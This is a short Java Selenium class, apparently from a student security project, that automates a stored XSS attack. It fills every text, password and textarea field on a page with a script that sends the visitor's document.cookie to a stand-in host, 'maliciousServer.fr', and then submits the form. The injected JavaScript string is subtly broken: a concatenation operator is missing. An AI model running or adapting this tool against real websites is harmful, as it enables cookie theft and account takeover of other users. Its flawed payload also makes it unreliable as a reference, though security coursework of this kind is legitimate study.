package fr.isep.projetseculogiciel;

// package com.example.demo;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;

import java.util.List;

public class F3Controller {

    private WebDriver driver;

    public F3Controller(String url) {
    // Set the path to your ChromeDriver executable
    System.setProperty("webdriver.chrome.driver", "C:/Users/marcn/Downloads/chromedriver-win64/chromedriver-win64/chromedriver.exe");

    // Optional: Set Chrome options (e.g., headless mode)
    ChromeOptions options = new ChromeOptions();
    // options.addArguments("--headless"); // UChrome in headless mode

    this.driver = new ChromeDriver(options);

    try {
        // Navigate to the desired URL
        driver.get(url);

    } catch (Exception e) {
        e.printStackTrace();
    }
}

public void performXss() {
    try {
        // Find all text input elements on the page
        List<WebElement> textInputs = driver.findElements(By.cssSelector("input[type='text'], input[type='password'], textarea"));
        System.out.println(textInputs);
        Thread.sleep(1000);

        String enpointUrl = "https://www.maliciousServer.fr";

        // Iterate through each text input element and set a special text
        for (WebElement input : textInputs) {

            // TODO : SEND THE COOKIE IN AN EXTRNAL ENDPOINT URL
            input.sendKeys("<script>document.write('<img src=" + enpointUrl + "?cookie=' document.cookie+' />');</script>");
            Thread.sleep(1000);
        }

        // Localisez l'élément du formulaire
        WebElement form = driver.findElement(By.cssSelector("form"));
        form.submit();

        Thread.sleep(1000);

    } catch (Exception e) {
        e.printStackTrace();
    } finally {
        // Close the WebDriver
        driver.quit();
    }
}


}
